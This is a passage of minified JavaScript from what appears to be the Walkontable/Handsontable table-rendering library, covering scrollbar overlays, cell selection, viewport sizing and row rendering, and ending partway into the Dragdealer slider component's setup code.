WalkontableOverlay;WalkontableCornerScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;var t;if(this.scrollHandler===window){t=this.instance.wtTable.hider.getBoundingClientRect();var n=Math.ceil(t.top,10);var r=Math.ceil(t.bottom,10);if(n<0&&r>0){e.style.top="0"}else{e.style.top=n+"px"}var i=Math.ceil(t.left,10);var s=Math.ceil(t.right,10);if(i<0&&s>0){e.style.left="0"}else{e.style.left=i+"px"}}else{t=this.scrollHandler.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.left=Math.ceil(t.left,10)+"px"}e.style.width=WalkontableDom.prototype.outerWidth(this.clone.wtTable.TABLE)+4+"px";e.style.height=WalkontableDom.prototype.outerHeight(this.clone.wtTable.TABLE)+4+"px"};WalkontableCornerScrollbarNative.prototype.prepare=function(){};WalkontableCornerScrollbarNative.prototype.refresh=function(e){this.measureBefore=0;this.measureAfter=0;this.clone&&this.clone.draw(e)};WalkontableCornerScrollbarNative.prototype.getScrollPosition=function(){};WalkontableCornerScrollbarNative.prototype.getLastCell=function(){};WalkontableCornerScrollbarNative.prototype.applyToDOM=function(){};WalkontableCornerScrollbarNative.prototype.scrollTo=function(){};WalkontableCornerScrollbarNative.prototype.readWindowSize=function(){};WalkontableCornerScrollbarNative.prototype.readSettings=function(){};WalkontableHorizontalScrollbarNative.prototype=new WalkontableOverlay;WalkontableHorizontalScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;var t;if(this.scrollHandler===window){t=this.instance.wtTable.hider.getBoundingClientRect();var n=Math.ceil(t.left,10);var r=Math.ceil(t.right,10);if(n<0&&r>0){e.style.left="0"}else{e.style.left=n+"px"}}else{t=this.scrollHandler.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.left=Math.ceil(t.left,10)+"px"}};WalkontableHorizontalScrollbarNative.prototype.react=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;if(this.instance.wtScrollbars.vertical.scrollHandler===window){var t=this.instance.wtTable.hider.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.height=WalkontableDom.prototype.outerHeight(this.clone.wtTable.TABLE)+"px"}else{this.clone.wtTable.holder.style.top=-(this.instance.wtScrollbars.vertical.windowScrollPosition-this.instance.wtScrollbars.vertical.measureBefore)+"px";e.style.height=this.instance.wtViewport.getWorkspaceHeight()+"px"}e.style.width=WalkontableDom.prototype.outerWidth(this.clone.wtTable.TABLE)+4+"px"};WalkontableHorizontalScrollbarNative.prototype.prepare=function(){};WalkontableHorizontalScrollbarNative.prototype.refresh=function(e){this.measureBefore=0;this.measureAfter=0;this.clone&&this.clone.draw(e)};WalkontableHorizontalScrollbarNative.prototype.getScrollPosition=function(){if(this.scrollHandler===window){return this.scrollHandler.scrollX}else{return this.scrollHandler.scrollLeft}};WalkontableHorizontalScrollbarNative.prototype.setScrollPosition=function(e){this.scrollHandler.scrollLeft=e};WalkontableHorizontalScrollbarNative.prototype.onScroll=function(){WalkontableOverlay.prototype.onScroll.apply(this,arguments);this.instance.getSetting("onScrollHorizontally")};WalkontableHorizontalScrollbarNative.prototype.getLastCell=function(){return this.instance.wtTable.getLastVisibleColumn()};WalkontableHorizontalScrollbarNative.prototype.applyToDOM=function(){this.fixedContainer.style.paddingLeft=this.measureBefore+"px";this.fixedContainer.style.paddingRight=this.measureAfter+"px"};WalkontableHorizontalScrollbarNative.prototype.scrollTo=function(e){this.$scrollHandler.scrollLeft(this.tableParentOffset+e*this.cellSize)};WalkontableHorizontalScrollbarNative.prototype.readWindowSize=function(){if(this.scrollHandler===window){this.windowSize=document.documentElement.clientWidth;this.tableParentOffset=this.instance.wtTable.holderOffset.left}else{this.windowSize=WalkontableDom.prototype.outerWidth(this.scrollHandler);this.tableParentOffset=0}this.windowScrollPosition=this.getScrollPosition()};WalkontableHorizontalScrollbarNative.prototype.readSettings=function(){this.offset=this.instance.getSetting("offsetColumn");this.total=this.instance.getSetting("totalColumns")};WalkontableVerticalScrollbarNative.prototype=new WalkontableOverlay;WalkontableVerticalScrollbarNative.prototype.resetFixedPosition=function(){if(!this.instance.wtTable.holder.parentNode){return}var e=this.clone.wtTable.holder.parentNode;var t;if(this.scrollHandler===window){t=this.instance.wtTable.hider.getBoundingClientRect();var n=Math.ceil(t.top,10);var r=Math.ceil(t.bottom,10);if(n<0&&r>0){e.style.top="0"}else{e.style.top=n+"px"}}else{t=this.instance.wtScrollbars.horizontal.scrollHandler.getBoundingClientRect();e.style.top=Math.ceil(t.top,10)+"px";e.style.left=Math.ceil(t.left,10)+"px"}if(this.instance.wtScrollbars.horizontal.scrollHandler===window){e.style.width=this.instance.wtViewport.getWorkspaceActualWidth()+"px"}else{e.style.width=WalkontableDom.prototype.outerWidth(this.instance.wtTable.holder.parentNode)+"px"}e.style.height=WalkontableDom.prototype.outerHeight(this.clone.wtTable.TABLE)+4+"px"};WalkontableVerticalScrollbarNative.prototype.react=function(){if(!this.instance.wtTable.holder.parentNode){return}if(this.instance.wtScrollbars.horizontal.scrollHandler!==window){var e=this.clone.wtTable.holder.parentNode;e.firstChild.style.left=-this.instance.wtScrollbars.horizontal.windowScrollPosition+"px"}};WalkontableVerticalScrollbarNative.prototype.getScrollPosition=function(){if(this.scrollHandler===window){return this.scrollHandler.scrollY}else{return this.scrollHandler.scrollTop}};WalkontableVerticalScrollbarNative.prototype.setScrollPosition=function(e){this.scrollHandler.scrollTop=e};WalkontableVerticalScrollbarNative.prototype.onScroll=function(e){WalkontableOverlay.prototype.onScroll.apply(this,arguments);var t;var n=0;if(1==1||this.windowScrollPosition>this.tableParentOffset){t=this.windowScrollPosition-this.tableParentOffset;partialOffset=0;if(t>0){var r=0;var i;for(var s=0;s<this.total;s++){i=this.instance.getSetting("rowHeight",s);r+=i;if(r>t){break}}if(this.offset>0){partialOffset=r-t}n=s;n=Math.min(n,this.total)}}this.curOuts=n>this.maxOuts?this.maxOuts:n;n-=this.curOuts;this.instance.update("offsetRow",n);this.readSettings();this.instance.draw();this.instance.getSetting("onScrollVertically")};WalkontableVerticalScrollbarNative.prototype.getLastCell=function(){return this.instance.getSetting("offsetRow")+this.instance.wtTable.tbodyChildrenLength-1};var partialOffset=0;WalkontableVerticalScrollbarNative.prototype.sumCellSizes=function(e,t){var n=0;while(e<t){n+=this.instance.getSetting("rowHeight",e);e++}return n};WalkontableVerticalScrollbarNative.prototype.applyToDOM=function(){var e=this.instance.wtViewport.getColumnHeaderHeight();this.fixedContainer.style.height=e+this.sumCellSizes(0,this.total)+4+"px";this.fixed.style.top=this.measureBefore+"px";this.fixed.style.bottom=""};WalkontableVerticalScrollbarNative.prototype.scrollTo=function(e){var t=this.tableParentOffset+e*this.cellSize;this.$scrollHandler.scrollTop(t);this.onScroll(t)};WalkontableVerticalScrollbarNative.prototype.readWindowSize=function(){if(this.scrollHandler===window){this.windowSize=document.documentElement.clientHeight;this.tableParentOffset=this.instance.wtTable.holderOffset.top}else{this.windowSize=this.scrollHandler.clientHeight;this.tableParentOffset=0}this.windowScrollPosition=this.getScrollPosition()};WalkontableVerticalScrollbarNative.prototype.readSettings=function(){this.offset=this.instance.getSetting("offsetRow");this.total=this.instance.getSetting("totalRows")};WalkontableScrollbars.prototype.registerListeners=function(){function u(){if(!e.instance.wtTable.holder.parentNode){e.destroy();return}e.vertical.windowScrollPosition=e.vertical.getScrollPosition();e.horizontal.windowScrollPosition=e.horizontal.getScrollPosition();e.box=e.instance.wtTable.hider.getBoundingClientRect();if((e.box.width!==s||e.box.height!==o)&&e.instance.rowHeightCache){s=e.box.width;o=e.box.height;e.instance.draw()}if(e.vertical.windowScrollPosition!==t||e.horizontal.windowScrollPosition!==n||e.box.top!==r||e.box.left!==i){e.vertical.onScroll();e.horizontal.onScroll();e.vertical.react();e.horizontal.react();t=e.vertical.windowScrollPosition;n=e.horizontal.windowScrollPosition;r=e.box.top;i=e.box.left}}var e=this;var t,n,r,i,s,o;var a=$(window);this.vertical.$scrollHandler.on("scroll."+this.instance.guid,u);if(this.vertical.scrollHandler!==this.horizontal.scrollHandler){this.horizontal.$scrollHandler.on("scroll."+this.instance.guid,u)}if(this.vertical.scrollHandler!==window&&this.horizontal.scrollHandler!==window){a.on("scroll."+this.instance.guid,u)}a.on("load."+this.instance.guid,u);a.on("resize."+this.instance.guid,u);$(document).on("ready."+this.instance.guid,u);setInterval(u,100)};WalkontableScrollbars.prototype.destroy=function(){this.vertical&&this.vertical.destroy();this.horizontal&&this.horizontal.destroy()};WalkontableScrollbars.prototype.refresh=function(e){this.horizontal&&this.horizontal.readSettings();this.vertical&&this.vertical.readSettings();this.horizontal&&this.horizontal.prepare();this.vertical&&this.vertical.prepare();this.horizontal&&this.horizontal.refresh(e);this.vertical&&this.vertical.refresh(e);this.corner&&this.corner.refresh(e);this.debug&&this.debug.refresh(e)};WalkontableSelection.prototype.add=function(e){this.selected.push(e)};WalkontableSelection.prototype.clear=function(){this.selected.length=0};WalkontableSelection.prototype.getCorners=function(){var e,t,n,r,i,s=this.selected.length;if(s>0){e=n=this.selected[0][0];t=r=this.selected[0][1];if(s>1){for(i=1;i<s;i++){if(this.selected[i][0]<e){e=this.selected[i][0]}else if(this.selected[i][0]>n){n=this.selected[i][0]}if(this.selected[i][1]<t){t=this.selected[i][1]}else if(this.selected[i][1]>r){r=this.selected[i][1]}}}}return[e,t,n,r]};WalkontableSelection.prototype.draw=function(){var e,t,n,r,i;var s=this.instance.wtTable.rowStrategy.countVisible(),o=this.instance.wtTable.columnStrategy.countVisible();if(this.selected.length){e=this.getCorners();for(t=0;t<s;t++){for(n=0;n<o;n++){r=this.instance.wtTable.rowFilter.visibleToSource(t);i=this.instance.wtTable.columnFilter.visibleToSource(n);if(r>=e[0]&&r<=e[2]&&i>=e[1]&&i<=e[3]){this.instance.wtTable.currentCellCache.add(t,n,this.settings.className)}else if(r>=e[0]&&r<=e[2]){this.instance.wtTable.currentCellCache.add(t,n,this.settings.highlightRowClassName)}else if(i>=e[1]&&i<=e[3]){this.instance.wtTable.currentCellCache.add(t,n,this.settings.highlightColumnClassName)}}}this.border&&this.border.appear(e)}else{this.border&&this.border.disappear()}};WalkontableSettings.prototype.update=function(e,t){if(t===void 0){for(var n in e){if(e.hasOwnProperty(n)){this.settings[n]=e[n]}}}else{this.settings[e]=t}return this.instance};WalkontableSettings.prototype.getSetting=function(e,t,n,r){if(this[e]){return this[e](t,n,r)}else{return this._getSetting(e,t,n,r)}};WalkontableSettings.prototype._getSetting=function(e,t,n,r){if(typeof this.settings[e]==="function"){return this.settings[e](t,n,r)}else if(t!==void 0&&Object.prototype.toString.call(this.settings[e])==="[object Array]"){return this.settings[e][t]}else{return this.settings[e]}};WalkontableSettings.prototype.has=function(e){return!!this.settings[e]};WalkontableSettings.prototype.rowHeight=function(e,t){if(!this.instance.rowHeightCache){this.instance.rowHeightCache=[]}if(this.instance.rowHeightCache[e]===void 0){var n=23;if(t){n=this.instance.wtDom.outerHeight(t);this.instance.rowHeightCache[e]=n}return n}else{return this.instance.rowHeightCache[e]}};WalkontableTable.prototype.refreshHiderDimensions=function(){var e=this.instance.wtViewport.getWorkspaceHeight();var t=this.instance.wtViewport.getWorkspaceWidth();var n=this.spreader.style;if((e!==Infinity||t!==Infinity)&&!this.instance.getSetting("nativeScrollbars")){if(e===Infinity){e=this.instance.wtViewport.getWorkspaceActualHeight()}if(t===Infinity){t=this.instance.wtViewport.getWorkspaceActualWidth()}this.hiderStyle.overflow="hidden";n.position="absolute";n.top="0";n.left="0";if(!this.instance.getSetting("nativeScrollbars")){n.height="4000px";n.width="4000px"}if(e<0){e=0}this.hiderStyle.height=e+"px";this.hiderStyle.width=t+"px"}else{n.position="relative";n.width="auto";n.height="auto"}};WalkontableTable.prototype.refreshStretching=function(){if(this.instance.cloneSource){return}var e=this.instance,t=e.getSetting("stretchH"),n=e.getSetting("totalRows"),r=e.getSetting("totalColumns"),i=e.getSetting("offsetColumn");var s=function(e){var t=o.instance.wtViewport.getViewportWidth(e);if(t<e&&o.instance.getSetting("nativeScrollbars")){return Infinity}return t};var o=this;var u=function(t){var n=o.columnFilter.visibleToSource(t);if(n<r){return e.getSetting("columnWidth",n)}};if(t==="hybrid"){if(i>0){t="last"}else{t="none"}}var a=function(e){if(o.instance.getSetting("nativeScrollbars")){if(o.instance.cloneOverlay instanceof WalkontableDebugOverlay){return Infinity}else{return 2*o.instance.wtViewport.getViewportHeight(e)}}return o.instance.wtViewport.getViewportHeight(e)};var f=function(e,t){if(o.instance.getSetting("nativeScrollbars")){return 20}var r=o.rowFilter.visibleToSource(e);if(r<n){if(o.verticalRenderReverse&&e===0){return o.instance.getSetting("rowHeight",r,t)-1}else{return o.instance.getSetting("rowHeight",r,t)}}};this.columnStrategy=new WalkontableColumnStrategy(e,s,u,t);this.rowStrategy=new WalkontableRowStrategy(e,a,f)};WalkontableTable.prototype.adjustAvailableNodes=function(){var e,t=this.instance.getSetting("rowHeaders"),n=t.length,r=this.instance.getSetting("columnHeaders"),i,s,o;while(this.colgroupChildrenLength<n){this.COLGROUP.appendChild(document.createElement("COL"));this.colgroupChildrenLength++}this.refreshStretching();if(this.instance.cloneSource&&(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative)){e=this.instance.getSetting("fixedColumnsLeft")}else{e=this.columnStrategy.cellCount}while(this.colgroupChildrenLength<e+n){this.COLGROUP.appendChild(document.createElement("COL"));this.colgroupChildrenLength++}while(this.colgroupChildrenLength>e+n){this.COLGROUP.removeChild(this.COLGROUP.lastChild);this.colgroupChildrenLength--}i=this.THEAD.firstChild;if(r.length){if(!i){i=document.createElement("TR");this.THEAD.appendChild(i)}this.theadChildrenLength=i.childNodes.length;while(this.theadChildrenLength<e+n){i.appendChild(document.createElement("TH"));this.theadChildrenLength++}while(this.theadChildrenLength>e+n){i.removeChild(i.lastChild);this.theadChildrenLength--}}else if(i){this.wtDom.empty(i)}for(o=0;o<this.colgroupChildrenLength;o++){if(o<n){this.wtDom.addClass(this.COLGROUP.childNodes[o],"rowHeader")}else{this.wtDom.removeClass(this.COLGROUP.childNodes[o],"rowHeader")}}if(r.length){i=this.THEAD.firstChild;if(n){s=i.firstChild;for(o=0;o<n;o++){t[o](-n+o,s);s=s.nextSibling}}}for(o=0;o<e;o++){if(r.length){r[0](this.columnFilter.visibleToSource(o),i.childNodes[n+o])}}};WalkontableTable.prototype.adjustColumns=function(e,t){var n=e.childNodes.length;while(n<t){var r=document.createElement("TD");e.appendChild(r);n++}while(n>t){e.removeChild(e.lastChild);n--}};WalkontableTable.prototype.draw=function(e){if(this.instance.getSetting("nativeScrollbars")){this.verticalRenderReverse=false}this.rowFilter.readSettings(this.instance);this.columnFilter.readSettings(this.instance);if(!e){if(this.instance.getSetting("nativeScrollbars")){if(this.instance.cloneSource){this.tableOffset=this.instance.cloneSource.wtTable.tableOffset}else{this.holderOffset=this.wtDom.offset(this.holder);this.tableOffset=this.wtDom.offset(this.TABLE);this.instance.wtScrollbars.vertical.readWindowSize();this.instance.wtScrollbars.horizontal.readWindowSize();this.instance.wtViewport.resetSettings()}}else{this.tableOffset=this.wtDom.offset(this.TABLE);this.instance.wtViewport.resetSettings()}this._doDraw()}else{this.instance.wtScrollbars&&this.instance.wtScrollbars.refresh(true)}this.refreshPositions(e);if(!e){if(this.instance.getSetting("nativeScrollbars")){if(!this.instance.cloneSource){this.instance.wtScrollbars.vertical.resetFixedPosition();this.instance.wtScrollbars.horizontal.resetFixedPosition();this.instance.wtScrollbars.corner.resetFixedPosition();this.instance.wtScrollbars.debug&&this.instance.wtScrollbars.debug.resetFixedPosition()}}}this.instance.drawn=true;return this};WalkontableTable.prototype._doDraw=function(){var e=0,t,n,r,i=this.instance.getSetting("offsetRow"),s=this.instance.getSetting("totalRows"),o=this.instance.getSetting("totalColumns"),u,a=this.instance.getSetting("rowHeaders"),f=a.length,l,c,h,p=false,d,v,m;if(this.verticalRenderReverse){v=i}var g=false;if(this.verticalRenderReverse){if(i===s-this.rowFilter.fixedCount-1){g=true}else{this.instance.update("offsetRow",i+1);this.rowFilter.readSettings(this.instance)}}if(this.instance.cloneSource){this.columnStrategy=this.instance.cloneSource.wtTable.columnStrategy;this.rowStrategy=this.instance.cloneSource.wtTable.rowStrategy}if(o>0){t=this.rowFilter.visibleToSource(e);var y=this.instance.getSetting("fixedRowsTop");var b;if(this.instance.cloneSource){if(this.instance.cloneOverlay instanceof WalkontableVerticalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative){b=y}else if(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative){b=this.rowStrategy.countVisible()}}this.adjustAvailableNodes();p=true;if(this.instance.cloneSource&&(this.instance.cloneOverlay instanceof WalkontableHorizontalScrollbarNative||this.instance.cloneOverlay instanceof WalkontableCornerScrollbarNative)){u=this.instance.getSetting("fixedColumnsLeft")}else{u=this.columnStrategy.cellCount}if(!this.instance.cloneSource){d=this.instance.wtViewport.getWorkspaceWidth();this.columnStrategy.stretch()}for(n=0;n<u;n++){this.COLGROUP.childNodes[n+f].style.width=this.columnStrategy.getSize(n)+"px"}while(t<s&&t>=0){if(e>1e3){throw new Error("Security brake: Too much TRs. Please define height for your table, which will enforce scrollbars.")}if(b!==void 0&&e===b){break}if(e>=this.tbodyChildrenLength||this.verticalRenderReverse&&e>=this.rowFilter.fixedCount){l=document.createElement("TR");for(n=0;n<f;n++){l.appendChild(document.createElement("TH"))}if(this.verticalRenderReverse&&e>=this.rowFilter.fixedCount){this.TBODY.insertBefore(l,this.TBODY.childNodes[this.rowFilter.fixedCount]||this.TBODY.firstChild)}else{this.TBODY.appendChild(l)}this.tbodyChildrenLength++}else if(e===0){l=this.TBODY.firstChild}else{l=l.nextSibling}h=l.firstChild;for(n=0;n<f;n++){if(h.nodeName=="TD"){c=h;h=document.createElement("TH");l.insertBefore(h,c);l.removeChild(c)}a[n](t,h);h=h.nextSibling}this.adjustColumns(l,u+f);for(n=0;n<u;n++){r=this.columnFilter.visibleToSource(n);if(n===0){c=l.childNodes[this.columnFilter.sourceColumnToVisibleRowHeadedColumn(r)]}else{c=c.nextSibling}if(c.nodeName=="TH"){h=c;c=document.createElement("TD");l.insertBefore(c,h);l.removeChild(h)}c.className="";c.removeAttribute("style");this.instance.getSetting("cellRenderer",t,r,c)}i=this.instance.getSetting("offsetRow");if(this.verticalRenderReverse&&g){if(-this.wtDom.outerHeight(l.firstChild)<this.rowStrategy.remainingSize){this.TBODY.removeChild(l);this.instance.update("offsetRow",i+1);this.tbodyChildrenLength--;this.rowFilter.readSettings(this.instance);break}else if(!this.instance.cloneSource){m=this.rowStrategy.add(e,c,this.verticalRenderReverse);if(m===false){this.rowStrategy.removeOutstanding()}}}else if(!this.instance.cloneSource){m=this.rowStrategy.add(e,c,this.verticalRenderReverse);if(m===false){if(!this.instance.getSetting("nativeScrollbars")){this.rowStrategy.removeOutstanding()}}if(this.rowStrategy.isLastIncomplete()){if(this.verticalRenderReverse&&!this.isRowInViewport(v)){this.verticalRenderReverse=false;this.instance.update("offsetRow",v);this.draw();return}break}}if(this.instance.getSetting("nativeScrollbars")){if(this.instance.cloneSource){l.style.height=this.instance.getSetting("rowHeight",t)+"px"}else{this.instance.getSetting("rowHeight",t,c)}}if(this.verticalRenderReverse&&e>=this.rowFilter.fixedCount){if(i===0){break}this.instance.update("offsetRow",i-1);this.rowFilter.readSettings(this.instance)}else{e++}t=this.rowFilter.visibleToSource(e)}}if(!p){this.adjustAvailableNodes()}if(!(this.instance.cloneOverlay instanceof WalkontableDebugOverlay)){e=this.rowStrategy.countVisible();while(this.tbodyChildrenLength>e){this.TBODY.removeChild(this.TBODY.lastChild);this.tbodyChildrenLength--}}this.instance.wtScrollbars&&this.instance.wtScrollbars.refresh(false);if(!this.instance.cloneSource){if(d!==this.instance.wtViewport.getWorkspaceWidth()){this.columnStrategy.stretch();for(n=0;n<this.columnStrategy.cellCount;n++){this.COLGROUP.childNodes[n+f].style.width=this.columnStrategy.getSize(n)+"px"}}}this.verticalRenderReverse=false};WalkontableTable.prototype.refreshPositions=function(e){this.refreshHiderDimensions();this.refreshSelections(e)};WalkontableTable.prototype.refreshSelections=function(e){var t,n,r,i,s,o,u=[],a=this.rowStrategy.countVisible(),f=this.columnStrategy.countVisible();this.oldCellCache=this.currentCellCache;this.currentCellCache=new WalkontableClassNameCache;if(this.instance.selections){for(n in this.instance.selections){if(this.instance.selections.hasOwnProperty(n)){this.instance.selections[n].draw();if(this.instance.selections[n].settings.className){u.push(this.instance.selections[n].settings.className)}if(this.instance.selections[n].settings.highlightRowClassName){u.push(this.instance.selections[n].settings.highlightRowClassName)}if(this.instance.selections[n].settings.highlightColumnClassName){u.push(this.instance.selections[n].settings.highlightColumnClassName)}}}}o=u.length;for(t=0;t<a;t++){for(r=0;r<f;r++){n=this.rowFilter.visibleToSource(t);i=this.columnFilter.visibleToSource(r);for(s=0;s<o;s++){if(this.currentCellCache.test(t,r,u[s])){this.wtDom.addClass(this.getCell([n,i]),u[s])}else if(e&&this.oldCellCache.test(t,r,u[s])){this.wtDom.removeClass(this.getCell([n,i]),u[s])}}}}};WalkontableTable.prototype.getCell=function(e){if(this.isRowBeforeViewport(e[0])){return-1}else if(this.isRowAfterViewport(e[0])){return-2}else{if(this.isColumnBeforeViewport(e[1])){return-3}else if(this.isColumnAfterViewport(e[1])){return-4}else{try{return this.TBODY.childNodes[this.rowFilter.sourceToVisible(e[0])].childNodes[this.columnFilter.sourceColumnToVisibleRowHeadedColumn(e[1])]}catch(t){}}}};WalkontableTable.prototype.getCoords=function(e){return[this.rowFilter.visibleToSource(this.wtDom.index(e.parentNode)),this.columnFilter.visibleRowHeadedColumnToSourceColumn(e.cellIndex)]};WalkontableTable.prototype.getLastVisibleRow=function(){var e=0;var t=jQuery(".htCore > tbody > tr").toArray().map(function(t){var n=jQuery(t).innerHeight();e+=n;return n});var n=this.rowStrategy.cellSizesSum;if(Math.abs(e-n)>5){this.rowStrategy.cellSizes=t;this.instance.wtSettings.instance.rowHeightCache=t;this.rowStrategy.cellSizesSum=e-1;this.rowStrategy.cellCount=this.rowStrategy.cellSizes.length;this.rowStrategy.remainingSize=e-n}return this.rowFilter.visibleToSource(this.rowStrategy.cellCount-1)};WalkontableTable.prototype.getLastVisibleColumn=function(){return this.columnFilter.visibleToSource(this.columnStrategy.cellCount-1)};WalkontableTable.prototype.isRowBeforeViewport=function(e){return this.rowFilter.sourceToVisible(e)<this.rowFilter.fixedCount&&e>=this.rowFilter.fixedCount};WalkontableTable.prototype.isRowAfterViewport=function(e){return e>this.getLastVisibleRow()};WalkontableTable.prototype.isColumnBeforeViewport=function(e){return this.columnFilter.sourceToVisible(e)<this.columnFilter.fixedCount&&e>=this.columnFilter.fixedCount};WalkontableTable.prototype.isColumnAfterViewport=function(e){return e>this.getLastVisibleColumn()};WalkontableTable.prototype.isRowInViewport=function(e){return!this.isRowBeforeViewport(e)&&!this.isRowAfterViewport(e)};WalkontableTable.prototype.isColumnInViewport=function(e){return!this.isColumnBeforeViewport(e)&&!this.isColumnAfterViewport(e)};WalkontableTable.prototype.isLastRowFullyVisible=function(){return this.getLastVisibleRow()===this.instance.getSetting("totalRows")-1&&!this.rowStrategy.isLastIncomplete()};WalkontableTable.prototype.isLastColumnFullyVisible=function(){return this.getLastVisibleColumn()===this.instance.getSetting("totalColumns")-1&&!this.columnStrategy.isLastIncomplete()};WalkontableViewport.prototype.getWorkspaceHeight=function(e){if(this.instance.getSetting("nativeScrollbars")){return this.instance.wtScrollbars.vertical.windowSize}var t=this.instance.getSetting("height");if(t===Infinity||t===void 0||t===null||t<1){if(this.instance.wtScrollbars.vertical instanceof WalkontableOverlay){t=this.instance.wtScrollbars.vertical.availableSize()}else{t=Infinity}}if(t!==Infinity){if(e>=t){t-=this.instance.getSetting("scrollbarHeight")}else if(this.instance.wtScrollbars.horizontal.visible){t-=this.instance.getSetting("scrollbarHeight")}}return t};WalkontableViewport.prototype.getWorkspaceWidth=function(e){var t=this.instance.getSetting("width");if(t===Infinity||t===void 0||t===null||t<1){if(this.instance.wtScrollbars.horizontal instanceof WalkontableOverlay){t=this.instance.wtScrollbars.horizontal.availableSize()}else{t=Infinity}}if(t!==Infinity){if(e>=t){t-=this.instance.getSetting("scrollbarWidth")}else if(this.instance.wtScrollbars.vertical.visible){t-=this.instance.getSetting("scrollbarWidth")}}return t};WalkontableViewport.prototype.getWorkspaceActualHeight=function(){return this.instance.wtDom.outerHeight(this.instance.wtTable.TABLE)};WalkontableViewport.prototype.getWorkspaceActualWidth=function(){return this.instance.wtDom.outerWidth(this.instance.wtTable.TABLE)||this.instance.wtDom.outerWidth(this.instance.wtTable.TBODY)||this.instance.wtDom.outerWidth(this.instance.wtTable.THEAD)};WalkontableViewport.prototype.getColumnHeaderHeight=function(){if(isNaN(this.columnHeaderHeight)){var e=this.instance.wtDom.offset(this.instance.wtTable.TBODY),t=this.instance.wtTable.tableOffset;this.columnHeaderHeight=e.top-t.top}return this.columnHeaderHeight};WalkontableViewport.prototype.getViewportHeight=function(e){var t=this.getWorkspaceHeight(e);if(t===Infinity){return t}var n=this.getColumnHeaderHeight();if(n>0){return t-n}else{return t}};WalkontableViewport.prototype.getRowHeaderWidth=function(){if(this.instance.cloneSource){return this.instance.cloneSource.wtViewport.getRowHeaderWidth()}if(isNaN(this.rowHeaderWidth)){var e=this.instance.getSetting("rowHeaders");if(e.length){var t=this.instance.wtTable.TABLE.querySelector("TH");this.rowHeaderWidth=0;for(var n=0,r=e.length;n<r;n++){if(t){this.rowHeaderWidth+=this.instance.wtDom.outerWidth(t);t=t.nextSibling}else{this.rowHeaderWidth+=50}}}else{this.rowHeaderWidth=0}}return this.rowHeaderWidth};WalkontableViewport.prototype.getViewportWidth=function(e){var t=this.getWorkspaceWidth(e);if(t===Infinity){return t}var n=this.getRowHeaderWidth();if(n>0){return t-n}else{return t}};WalkontableViewport.prototype.resetSettings=function(){this.rowHeaderWidth=NaN;this.columnHeaderHeight=NaN};var Cursor={x:0,y:0,init:function(){this.setEvent("mouse");this.setEvent("touch")},setEvent:function(e){var t=document["on"+e+"move"]||function(){};document["on"+e+"move"]=function(e){t(e);Cursor.refresh(e)}},refresh:function(e){if(!e){e=window.event}if(e.type=="mousemove"){this.set(e)}else if(e.touches){this.set(e.touches[0])}},set:function(e){if(e.pageX||e.pageY){this.x=e.pageX;this.y=e.pageY}else if(document.body&&(e.clientX||e.clientY)){this.x=e.clientX+document.body.scrollLeft+document.documentElement.scrollLeft;this.y=e.clientY+document.body.scrollTop+document.documentElement.scrollTop}}};Cursor.init();var Position={get:function(e){var t=0,n=0;if(e.offsetParent){do{n+=e.offsetLeft;t+=e.offsetTop}while(e=e.offsetParent)}return[n,t]}};var Dragdealer=function(e,t){if(typeof e=="string"){e=document.getElementById(e)}if(!e){return}var n=e.getElementsByTagName("div")[0];if(!n||n.className.search(/(^|\s)handle(\s|$)/)==-1){return}this.init(e,n,t||{});this.setup()};Dragdealer.prototype={init:function(e,t,n){this.wrapper=e;this.handle=t;this.options=n;this.disabled=this.getOption("disabled",false);this.horizontal=this.getOption("horizontal",true);this.vertical=this.getOption("vertical",false);this.slide=this.getOption("slide",true);this.steps=this.getOption("steps",0);this.snap=this.getOption("snap",false);this.loose=this.getOption("loose",false);this.speed=this.getOption("speed",10)/100;this.xPrecision=this.getOption("xPrecision",0);this.yPrecision=this.getOption("yPrecision",0);this.callback=n.callback||null;this.animationCallback=n.animationCallback||null;this.bounds={left:n.left||0,right:-(n.right||0),top:n.top||0,bottom:-(n.bottom||0),x0:0,x1:0,xRange:0,y0:0,y1:0,yRange:0};this.value={prev:[-1,-1],current:[n.x||0,n.y||0],target:[n.x||0,n.y||0]};this.offset={wrapper:[0,0],mouse:[0,0],prev:[-999999,-999999],current:[0,0],target:[0,0]};this.change=[0,0];this.activity=false;this.dragging=false;this.tapping=false},getOption:function(e,t){return this.options[e]!==undefined?this.options[e]:t},setup:function(){this.setWrapperOffset();this.setBoundsPadding();this.setBounds();this.setSteps();this.addListeners()},setWrapperOffset:function(){this.offset.wrapper=Position.get(this.wrapper)},setBoundsPadding:function(){if(!this.bounds.left&&!this.bounds.right){this.bounds.left=Position.get(this.handle)[0]-this.offset.wrapper[0];this.bounds.right=-this.bounds.left}if(!this.bounds.top&&!this.bounds.bottom){this.bounds.top=Position.get(this.handle)[1]-this.offset.wrapper[1];this.bounds.bottom=-this.bounds.top}},setBounds:function(){this.bounds.x0=this.bounds.left;this.bounds.x1=this.wrapper.offsetWidth+this.bounds.right;this.bounds.xRange=this.bounds.x1-this.bounds.x0-this.handle.offsetWidth;this.bounds.y0=this.bounds.top;this.bounds.y1=this.wrapper.offsetHeight+this.bounds.bottom;this.bounds.yRange=this.bounds.y1-this.bounds.y0-this.handle.offsetHeight;this.bounds.xStep=1/(this.xPrecision||Math.max(this.wrapper.offsetWidth,this.handle.offsetWidth));this.bounds.yStep=1/(this.yPrecision||Math.max(this.wrapper.offsetHeight,this.handle.offsetHeight))},setSteps:function(){if(this.steps>1){this.stepRatios=[];for(var e=0;e<=this.steps-1;e++){this.stepRatios[e]=e/(this.steps-1)}}},addListeners:function(){var e=this;this.wrapper.onselectstart=function(){return false};this.handle.onmousedown=this.handle.ontouchstart=function(t){e.handleDownHandler(t)};this.wrapper.onmousedown=this.wrapper.ontouchstart=function(t){e.wrapperDownHandler(t)};var 